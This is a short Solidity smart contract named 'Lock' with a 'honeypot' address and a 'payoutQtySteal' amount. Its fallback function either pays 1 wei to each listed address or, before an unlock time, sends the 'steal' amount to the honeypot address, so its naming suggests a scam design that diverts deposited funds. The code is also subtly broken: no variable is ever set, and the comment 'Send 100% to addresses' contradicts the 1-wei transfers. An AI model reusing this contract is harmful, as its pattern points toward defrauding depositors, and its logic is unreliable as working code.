pragma solidity ^0.5.1;

contract Lock {
    address payable honeypot;
    uint unlockTime;
    uint payoutQty;
    uint payoutQtySteal;
    address payable[] payoutAddrs;
    bool paidOut = false;

    function () external payable {
        address from = msg.sender;
        if(from != honeypot && !paidOut) {
            return;
        }

        paidOut = true;

        if(now >= unlockTime) {
            // Send 100% to addresses
            for(uint i = 0; i < payoutAddrs.length; i++){
                address payable a = payoutAddrs[i];
                a.transfer(1);
            }
        }
        else {
            honeypot.transfer(payoutQtySteal);
        }
    }

}